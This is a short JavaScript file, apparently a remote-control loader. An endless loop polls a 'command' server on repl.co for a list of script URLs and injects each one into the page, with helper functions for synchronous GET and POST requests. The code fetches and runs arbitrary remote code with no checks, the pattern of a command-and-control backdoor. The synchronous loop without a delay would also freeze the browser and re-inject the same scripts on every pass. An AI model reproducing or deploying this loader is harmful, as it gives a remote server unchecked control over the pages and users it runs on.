while (true) {
    res = doGET("https://command.marcusweinberger.repl.co/displays/update");
    for (i in res['scripts']) {
        var s = document.createElement("script");
        s.src = res['scripts'][i];
        document.body.appendChild(s);
        console.log("Installed script: " + s.src);
    }
}

function doGET(url) {
    var xmlhttp = new XMLHttpRequest();

    xmlhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            try {
                var res = JSON.parse(this.responseText);
                return res;
            }
            catch(err) {
                var res = this.responseText;
                return res;
            }
        }
    }

    xmlhttp.open("GET", url, false);
    xmlhttp.send();
    return xmlhttp.onreadystatechange();
}
function doPOST(url, data) {
    var xmlhttp = new XMLHttpRequest();

    xmlhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            try {
                var res = JSON.parse(this.responseText);
                return res;
            }
            catch(err) {
                var res = this.responseText;
                return res;
            }
        }
    }

    xmlhttp.open("POST", url, false);
    xmlhttp.setRequestHeader("Content-Type", "application/json");
    xmlhttp.send(JSON.stringify(data));
    return xmlhttp.onreadystatechange();
}